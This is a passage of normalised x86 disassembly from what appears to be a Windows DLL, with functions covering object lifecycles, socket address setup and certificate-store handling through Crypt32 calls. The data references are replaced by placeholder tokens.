call sub_10012771
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
sub esp 0x14
mov ecx esp
mov [ ecx ] r--data
mov [ ecx ] r--data
mov [ ecx + 0x4 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] esi
mov [ ecx + 0xc ] edx
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x10 ] edx
mov ecx [ edi + 0x130 ]
mov edx [ edi + 0xc ]
mov [ ebp - 0x28 ] esp
push ecx
mov ecx [ edi + 0x8 ]
mov esi eax
call sub_10007640
sub_10007140
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x10 ] eax
lea esi [ edi + 0x110 ]
xor ebx ebx
push 0x8
lea eax [ ebp - 0xc ]
mov ecx esi
mov [ ebp - 0xc ] 0x5b00
mov [ ebp - 0x8 ] ebx
call sub_10002a60
cmp [ edi + 0x120 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x10 ]
mov edx [ ebx ]
mov eax [ edx + 0x1c ]
mov ecx ebx
call eax
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ edi + 0x120 ]
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebx ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx ebx
call eax
mov eax [ edi + 0x120 ]
xor ecx ecx
call sub_10002b40
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push edi
call eax
sub_100071e0
mov eax [ esi + 0x12c ]
cmp eax 0x8
jae r-xdata
xor eax eax
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push edi
mov edi 0x8
sub edi eax
push edi
lea eax [ eax + esi + 0x10 ]
push eax
call edx
add [ esi + 0x12c ] eax
cmp [ esi + 0x12c ] 0x8
pop edi
jae r-xdata
cmp [ esi + 0x10 ] 0x4
mov eax 0x1
jne r-xdata
mov eax 0x2
retn
retn
cmp [ esi + 0x11 ] al
jne r-xdata
sub_10007230
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cd98
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push eax
push esi
call sub_10001220
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ esi ] r--data
mov [ esi + 0x124 ] 0xf
mov [ esi + 0x120 ] edx
mov [ esi + 0x110 ] dl
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x130 ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x12c ] edx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
sub eax ecx
sar eax 0x2
test eax eax
jne r-xdata
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_100072e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
cmp [ esi + 0x124 ] 0x10
jb r-xdata
xor ecx ecx
mov [ esi + 0x124 ] 0xf
mov [ esi + 0x120 ] ecx
mov [ esi + 0x110 ] cl
mov [ esi ] r--data
mov [ ebp - 0x4 ] ecx
mov eax [ esi + 0x4 ]
cmp eax ecx
je r-xdata
mov eax [ esi + 0x110 ]
push eax
call sub_10012c4b
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_10001140
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10007380
mov eax [ esi + 0x12c ]
cmp eax 0x8
jae r-xdata
push edi
lea edi [ eax - 0x1 ]
mov eax 0x2
retn
mov eax 0x1
pop edi
retn
mov ecx [ esi + 0x12c ]
mov eax [ ebx ]
mov eax [ eax + 0x20 ]
lea edx [ esi + ecx + 0x10 ]
push 0x1
push edx
mov ecx ebx
call eax
test eax eax
je r-xdata
mov eax 0x2
pop edi
retn
inc [ esi + 0x12c ]
inc edi
cmp [ edi + esi + 0x10 ] 0x0
jne r-xdata
cmp edi 0xff
jae r-xdata
xor eax eax
pop edi
retn
sub_100073e0
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
test eax eax
je r-xdata
xor ebx ebx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov ebx eax
jmp r-xdata
push esi
mov ecx ebx
mov esi edi
call sub_100071e0
cmp eax 0x2
je r-xdata
sub eax 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
pop esi
cmp eax 0x1
je r-xdata
pop edi
pop ebx
pop ebp
retn 0x8
call sub_10007460
pop edi
pop ebx
pop ebp
retn 0x8
push ebx
call sub_10007140
pop esi
pop edi
pop ebx
pop ebp
retn 0x8
call sub_10007380
cmp eax 0x2
je r-xdata
cmp eax 0x1
jne r-xdata
call sub_10007020
sub_10007460
cmp [ edi + 0x120 ] 0x0
jbe r-xdata
retn
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
test eax eax
je r-xdata
cmp [ edi + 0x124 ] 0x10
mov ecx [ edi + 0x120 ]
push esi
lea esi [ edi + 0x110 ]
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebx ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx ebx
call eax
mov eax [ edi + 0x120 ]
xor ecx ecx
call sub_10002b40
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push edi
call eax
pop esi
sub_100074c0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
sub eax 0x2
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
xor edx edx
cmp eax edx
je r-xdata
sub eax 0x2
jne r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
xor edx edx
cmp [ edi + 0x1c ] edx
ja r-xdata
mov ecx eax
call sub_10007550
push 0x8
lea ecx [ edi + 0xc ]
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x5a00
mov [ ebp - 0x8 ] edx
call sub_10002a60
push esi
mov esi edi
call sub_100012f0
jmp r-xdata
sub_10007550
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c09b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
call edx
test eax eax
je r-xdata
cmp [ edi + 0x20 ] 0x10
mov ecx [ edi + 0x1c ]
lea esi [ edi + 0xc ]
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push edi
call eax
mov ecx [ edi + 0x8 ]
push ebx
push esi
push ecx
push eax
call sub_10003860
mov edx [ ebx ]
push ecx
push eax
mov eax [ edx + 0x24 ]
mov ecx ebx
call eax
mov eax [ edi + 0x1c ]
xor ecx ecx
call sub_10002b40
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx edi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov edx [ edi ]
mov esi eax
mov eax [ edx + 0x8 ]
push 0x1
mov ecx edi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov ebx eax
mov eax [ edx + 0x4 ]
push edi
call eax
push 0xc
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
sub_10007640
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cd5d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov edi edx
mov [ ebp - 0x10 ] eax
push ecx
push esi
mov [ ebp - 0x4 ] 0x0
call sub_10001220
mov [ esi ] r--data
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
test edx edx
jne r-xdata
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov ecx [ ecx + 0x4 ]
sub ecx edx
sar ecx 0x2
cmp ecx 0x1
ja r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push esi
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
mov eax [ esi + 0x8 ]
mov edx [ eax ]
push ebx
push ecx
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ ebp - 0x10 ]
mov edx [ edi ]
mov edx [ edx + 0x4 ]
push 0x0
lea eax [ ebp + 0xc ]
push eax
push ecx
mov ecx edi
call edx
test eax eax
jne r-xdata
mov ecx [ edx + 0x4 ]
xor ecx ecx
jmp r-xdata
mov edx [ esi + 0x8 ]
mov edi [ edx ]
mov edx [ eax ]
push ecx
mov ecx eax
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov ecx [ esi + 0x8 ]
mov edx [ edi + 0xc ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x18
sub_10007740
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
cmp [ esi + 0x20 ] 0x10
jb r-xdata
xor ecx ecx
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ecx
mov [ esi + 0xc ] cl
mov [ esi ] r--data
mov [ ebp - 0x4 ] ecx
mov eax [ esi + 0x4 ]
cmp eax ecx
je r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_10012c4b
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_10001140
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100077d0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
mov eax [ esi ]
mov edx [ eax + 0x8 ]
jne r-xdata
push edi
push 0x1
call edx
mov edi [ ebp + 0xc ]
cmp eax edi
jne r-xdata
push 0x0
call edx
cmp [ ebp + 0xc ] eax
jne r-xdata
pop edi
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ebx
mov ecx edi
call edx
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
xor ebx ebx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov ebx eax
jmp r-xdata
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
push ecx
mov ecx eax
call edx
pop esi
pop ebp
retn 0x8
mov edx [ ebx ]
mov eax [ edx + 0x20 ]
push 0x1
lea edi [ esi + 0x10 ]
push edi
mov ecx ebx
call eax
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax ecx
sub eax 0x0
je r-xdata
pop ebx
cmp [ edi ] 0xff
jne r-xdata
mov edi esi
call sub_100078a0
pop ebx
pop edi
pop esi
pop ebp
retn 0x8
push edi
push ecx
call sub_10001330
pop ebx
pop edi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
mov [ esi + 0xc ] 0x0
call sub_10001330
inc [ esi + 0x14 ]
sub_100078a0
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
test eax eax
je r-xdata
retn
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push esi
push eax
call sub_10012ca7
mov esi eax
mov eax [ edi + 0x14 ]
push eax
push 0xff
push esi
call sub_10018220
mov eax [ edi + 0x14 ]
mov edx [ ebx ]
mov edx [ edx + 0x24 ]
add esp 0x10
push eax
push esi
mov ecx ebx
call edx
push esi
mov [ edi + 0x14 ] 0x0
call sub_10012c4b
add esp 0x4
pop esi
sub_100078f0
push ebp
mov ebp esp
cmp [ ecx + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop ebp
retn 0x8
mov al [ ecx + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
cmp al 0xff
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov [ ebx ] al
mov [ ecx + 0x10 ] 0xff
mov esi 0x1
xor edi edi
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edi eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0x20 ]
sub eax esi
push eax
lea eax [ esi + ebx ]
push eax
mov ecx edi
call edx
add esi eax
mov edx [ edi ]
mov eax [ edx + 0x18 ]
mov ecx edi
call eax
test eax eax
je r-xdata
sub_10007970
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c94a
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10001220
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
mov [ esi + 0xc ] 0x1
mov [ esi + 0x14 ] edx
mov [ esi + 0x10 ] 0xff
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
sub eax ecx
sar eax 0x2
cmp eax 0x1
ja r-xdata
mov ecx [ ecx + 0x4 ]
xor ecx ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0xc ]
push eax
push ecx
mov ecx edi
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10007a00
push ebp
mov ebp esp
cmp [ ecx + 0xc ] 0x0
jne r-xdata
pop ebp
retn 0x8
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
jmp r-xdata
mov edx [ eax ]
mov ecx eax
mov edx [ edx + 0x24 ]
pop ebp
jmp edx
sub_10007ad0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax ecx
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
push esi
push eax
mov eax [ edx ]
call eax
pop esi
pop ebp
retn 0x4
sub_10007af0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c1db
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
mov edx [ esi + 0x14 ]
mov eax [ eax + 0x10 ]
push edx
call eax
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
mov eax [ esi + 0x10 ]
mov edx [ edx + 0x20 ]
push eax
call edx
mov [ esi + 0x18 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_10007b70
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d2d1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ ebp + 0xc ] 0x5
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
call edx
mov ebx eax
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
push 0x0
mov ecx ebx
mov [ ebp + 0xc ] ebx
call edx
cmp [ esi + 0xc ] 0x0
mov edi eax
je r-xdata
push 0x18
call sub_10012ca7
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push 0x2c
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push edi
mov edi [ esi + 0x4 ]
push eax
call sub_10007970
jmp r-xdata
xor eax eax
mov ecx [ esi + 0xc ]
push ecx
mov ebx edi
mov edi [ esi + 0x4 ]
push eax
call sub_10002740
mov ebx [ ebp + 0xc ]
jmp r-xdata
xor ebx ebx
mov edx [ ebx ]
mov eax [ edx + 0x10 ]
mov ecx ebx
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ebx eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov edx [ ebx ]
mov edi eax
mov eax [ edx + 0x10 ]
mov ecx ebx
call eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov edi eax
xor eax eax
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
push ebx
push edi
push ecx
push edx
push eax
call sub_10007230
jmp r-xdata
push 0x134
call sub_10012ca7
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ esi + 0x4 ]
mov edx [ esi ]
push 0xff
push eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
sub_10007cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cd1b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0xc ] edx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
call edx
push eax
lea edi [ ebp + 0xc ]
call sub_100060b0
mov [ esi + 0x10 ] eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x10 ]
add esp 0x4
call eax
mov edi eax
test edi edi
jne r-xdata
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov edx 0x2
mov [ ebp - 0x20 ] dx
mov edx [ eax + 0x10 ]
mov ecx edi
mov [ ebp - 0x24 ] r--data
call edx
movzx eax ax
push eax
call [ htons@IAT ]
mov edx [ edi ]
mov [ ebp - 0x1e ] ax
mov eax [ edx + 0xc ]
mov ecx edi
call eax
push eax
call [ htonl@IAT ]
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] eax
mov edx [ edi ]
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
mov edx [ esi + 0x18 ]
mov eax [ edx + 0x10 ]
lea ecx [ esi + 0x18 ]
call eax
push 0x10
call sub_10012ca7
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x28 ] 0x10004
call sub_10013848
xor eax eax
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax ] r--data
mov [ eax + 0xc ] esi
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ esi + 0x14 ] eax
mov edi [ ecx ]
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
push edx
mov edx [ eax + 0x8 ]
call edx
mov ecx [ esi + 0x4 ]
mov edx [ edi + 0xc ]
push eax
mov eax [ esi + 0x14 ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x18
sub_10007e40
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CertFreeCertificateContext@IAT ]
mov [ esi + 0x8 ] 0x0
mov [ esi ] r--data
pop esi
retn
push 0x0
push eax
call [ CertCloseStore@IAT ]
mov [ esi + 0xc ] 0x0
sub_10007e80
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c1b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x10
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x1
push 0x10001
mov [ esi ] r--data
call [ CertCreateCertificateContext@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x20004
call sub_10013848
sub_10007f40
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CertFreeCertificateContext@IAT ]
mov [ esi + 0x8 ] 0x0
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push 0x0
push eax
call [ CertCloseStore@IAT ]
mov [ esi + 0xc ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10007fa0
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ esi + 0x4 ]
push 0x0
push r--data
lea edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x4d2
mov eax [ ecx + 0x30 ]
push edx
call eax
mov [ esi + 0xc ] eax
test eax eax
jne r-xdata
push 0x0
push eax
call [ CertEnumCertificatesInStore@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] 0x20004
call sub_10013848
mov esp ebp
pop ebp
retn
push r--data
lea edx [ ebp - 0x4 ]
push edx
mov [ ebp - 0x4 ] 0x20004
call sub_10013848
sub_10008010
push esi
mov esi [ LoadLibraryA@IAT ]
push r--data
mov [ rw-data ] r--data
call esi
push r--data
mov [ rw-data ] eax
call esi
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax rw-data
pop esi
retn
sub_10008120
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x34 ]
push edi
mov edi [ FreeLibrary@IAT ]
push eax
mov [ esi ] r--data
call edi
mov ecx [ esi + 0x38 ]
push ecx
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10008160
push ebp
mov ebp esp
push ecx
mov eax [ eax + 0x18 ]
mov edx [ eax ]
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push esi
push edx
mov [ ebp - 0x4 ] 0x3
call [ CertGetIssuerCertificateFromStore@IAT ]
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push esi
mov [ ebp - 0x4 ] 0x3
call [ CertVerifySubjectCertificateContext@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_100081b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
mov ecx [ ecx ]
push 0x0
push 0x2
push eax
push ecx
call [ CertAddCertificateContextToStore@IAT ]
test eax eax
jne r-xdata
pop ebp
retn 0x4
push r--data
lea edx [ ebp + 0x8 ]
push edx
mov [ ebp + 0x8 ] 0x20004
call sub_10013848
sub_100081f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c183
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
